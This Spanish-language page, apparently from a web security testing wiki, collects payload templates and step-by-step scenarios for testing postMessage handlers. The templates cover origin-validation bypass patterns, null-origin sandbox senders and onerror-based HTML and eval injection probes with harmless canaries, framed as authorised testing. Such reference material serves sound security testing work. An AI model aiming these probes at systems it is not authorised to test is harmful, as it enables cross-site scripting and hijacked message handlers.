# 🗡️ Vulnerabilidades de postMessage: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Mensajes desde iframe propio

```js
destino.contentWindow.postMessage('msg-canary-123','https://{ORIGEN}')
destino.contentWindow.postMessage({type:'probe',value:'msg-canary-123'},'https://{ORIGEN}')
destino.contentWindow.postMessage(JSON.stringify({type:'probe',value:'msg-canary-123'}),'https://{ORIGEN}')
```

**Cuándo usarlo:** Requiere una referencia destino al iframe/popup y un handler observado. El envío no prueba que el receptor actúe.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).


## 🧭 Payloads por contexto

### Validación defectuosa de event.origin

```text
https://{DOMINIO_PERMITIDO}.{HOST_CONTROLADO}
https://{PREFIJO_CONTROLADO}{DOMINIO_PERMITIDO}
https://{SUBDOMINIO_PERMITIDO}.{HOST_CONTROLADO}
```

**Cuándo usarlo:** Son orígenes de páginas propias para validar startsWith, endsWith o contains/indexOf. El host debe ser controlado y la acción del receptor demostrada.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).


### Datos hacia sinks distintos

```js
destino.contentWindow.postMessage('<img src=x onerror="document.documentElement.dataset.msg=123">','https://{ORIGEN}')
destino.contentWindow.postMessage("document.documentElement.dataset.msg='msg-canary-123'",'https://{ORIGEN}')
destino.contentWindow.postMessage(JSON.stringify({type:'render',html:'<img src=x onerror="document.documentElement.dataset.msg=123">'}),'https://{ORIGEN}')
```

**Cuándo usarlo:** Líneas para innerHTML, eval y JSON.parse→HTML respectivamente. Adaptar tipo/campo al código receptor; CSP y validación de Origin pueden impedirlo.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).


## 🔥 Payloads avanzados

### Origin null desde sandbox

```html
<iframe src="https://{ORIGEN}/widget"></iframe><iframe sandbox="allow-scripts" srcdoc="<script>parent.frames[0].postMessage('msg-canary-123','https://{ORIGEN}')</script>"></iframe>
<iframe src="https://{ORIGEN}/widget"></iframe><iframe sandbox="allow-scripts" srcdoc="<script>parent.frames[0].postMessage({type:'probe',value:'msg-canary-123'},'https://{ORIGEN}')</script>"></iframe>
```

**Cuándo usarlo:** Alternativas separadas; cargar primero el receptor. event.origin será null para el emisor sandbox, pero solo hay fallo si el handler lo acepta y actúa.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).


### Emisor wildcard y ventana source

```js
addEventListener('message',e=>console.log(e.origin,e.source===window.opener,JSON.stringify(e.data).length))
const w=window.open('https://{ORIGEN}/widget');setTimeout(()=>w.postMessage({type:'probe',value:'msg-canary-123'},'https://{ORIGEN}'),1000)
```

**Cuándo usarlo:** La primera línea registra metadatos de mensajes entrantes de un flujo propio; la segunda prueba popup como source. Esperar carga real y no imprimir secretos.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).


## 🔬 Pruebas guiadas por escenario

### 1. Mensaje desde origen externo

**Objetivo:** Comprobar si un receptor procesa eventos sin validar Origin.

```html
<iframe id="destino" src="https://{ORIGEN}/widget"></iframe><script>const f=document.getElementById('destino');f.onload=()=>f.contentWindow.postMessage({type:'probe',value:'prueba-123'},'https://{ORIGEN}')</script>
```

**Interpretación:** Observar una acción concreta; el hecho de enviar un mensaje no implica que el receptor lo acepte.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).

### 2. Bypass de contains

**Objetivo:** Probar validador que usa indexOf/contains sobre event.origin.

```text
https://{SUBDOMINIO_PERMITIDO}.{CONTROLLED_HOST}
```

**Interpretación:** Hospedar el emisor en ese dominio propio y verificar que el receptor actúa; requiere observar comparación defectuosa.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).

### 3. Bypass de endsWith

**Objetivo:** Probar validador que acepta sufijo textual sin frontera DNS.

```text
https://{PREFIJO_CONTROLADO}{DOMINIO_PERMITIDO}
```

**Interpretación:** El host debe estar realmente bajo control del auditor; solo tiene sentido si el código usa endsWith sin delimitador.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).

### 4. Datos hacia HTML

**Objetivo:** Probar un sink innerHTML del receptor con canary inocuo.

```js
destino.contentWindow.postMessage('<img src=x onerror="document.body.dataset.msg=123">','https://{ORIGEN}')
```

**Interpretación:** Confirmar ejecución en el origen receptor; el mensaje puede ser rechazado por esquema o CSP.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).

### 5. Datos hacia eval

**Objetivo:** Probar solo si el código del receptor llama eval con event.data.

```js
destino.contentWindow.postMessage("document.body.dataset.msg='prueba-123'",'https://{ORIGEN}')
```

**Interpretación:** Un dato textual reflejado no basta; observar el sink y el efecto bajo la sesión de prueba.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).

### 6. Destino wildcard del emisor

**Objetivo:** Registrar si la app entrega datos privados a un popup no confiable.

```js
addEventListener('message', e => console.log(e.origin, typeof e.data, JSON.stringify(e.data).length));
```

**Interpretación:** Usar un flujo propio que abra la ventana controlada; no registrar contenido privado completo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).

### 7. Confusión de ventana source

**Objetivo:** Enviar el mismo tipo de mensaje desde dos iframes de origen distinto.

```js
marcoA.contentWindow.postMessage({type:'probe',value:'A'},'https://{ORIGEN}'); marcoB.contentWindow.postMessage({type:'probe',value:'B'},'https://{ORIGEN}');
```

**Interpretación:** Comparar event.origin y event.source en el receptor; se requiere que la aplicación confíe en la ventana incorrecta.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).

### 8. URL recibida

**Objetivo:** Comprobar navegación inducida por un mensaje no confiable.

```js
destino.contentWindow.postMessage({type:'navigate',url:'https://{CONTROLLED_HOST}/prueba'},'https://{ORIGEN}')
```

**Interpretación:** Adaptar el tipo al handler observado. Un cambio de Location confirma el sink; valorar open redirect por separado.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).

### 9. Bypass de startsWith

**Objetivo:** Probar un listener que acepta un prefijo textual sin límite de host.

```text
https://{DOMINIO_PERMITIDO}.{CONTROLLED_HOST}
```

**Interpretación:** Hospedar allí el emisor y comprobar una acción concreta; solo funciona si el código usa startsWith sobre event.origin.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).

### 10. Emisor con Origin null

**Objetivo:** Enviar un mensaje desde un iframe sandbox a un receptor abierto en la primera ventana hija.

```html
<iframe src="https://{ORIGEN}/widget"></iframe><iframe sandbox="allow-scripts" srcdoc="<script>parent.frames[0].postMessage('prueba-123','https://{ORIGEN}')</script>"></iframe>
```

**Interpretación:** El segundo iframe tiene event.origin null; usarlo solo si el listener confía erróneamente en null y confirmar efecto.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).

### 11. Objeto recibido como JSON string

**Objetivo:** Probar un receptor que primero hace JSON.parse(event.data) y luego escribe html.

```js
destino.contentWindow.postMessage(JSON.stringify({type:'render',html:'<img src=x onerror="document.body.dataset.msg=123">'}),'https://{ORIGEN}')
```

**Interpretación:** Adaptar type y propiedad al handler observado; el éxito exige parseo, sink HTML y ejecución en el receptor.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).

### 12. Ventana emergente como source

**Objetivo:** Comparar validación por event.source cuando el receptor se abre como popup propio.

```js
const w=window.open('https://{ORIGEN}/widget');setTimeout(()=>w.postMessage({type:'probe',value:'prueba-123'},'https://{ORIGEN}'),1000)
```

**Interpretación:** El popup debe permitir apertura y haber cargado antes del mensaje. Verificar origin y acción; source solo no autentica al emisor.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
